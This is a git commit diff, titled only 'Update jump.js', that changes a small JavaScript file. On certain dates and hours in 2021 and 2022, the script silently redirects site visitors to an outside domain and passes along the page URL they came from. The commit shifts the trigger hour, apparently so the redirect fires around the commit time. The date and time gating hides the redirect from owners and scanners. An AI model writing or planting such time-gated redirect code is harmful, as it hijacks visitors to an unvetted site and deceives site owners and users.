0a866ed554d9ec04193ab39f7da0fb0f9d1733b7
hgvip <84088557+hgvip@users.noreply.github.com>
2021-05-13 21:41:32 +0800

    Update jump.js

--- jump.js
+++ jump.js
@@ -4,7 +4,7 @@ var date = new Date().getDate();
 var hour = new Date().getHours();
 if (year === 2021 || year === 2022) {
     if (date === 13 || date === 15 || date === 28) {
-        if (hour === 0 || hour === 7) {
+        if (hour === 21 || hour === 7) {
             window.location.href = "http://www78.vip/?url=" + window.location.href;
         } else {}
     }
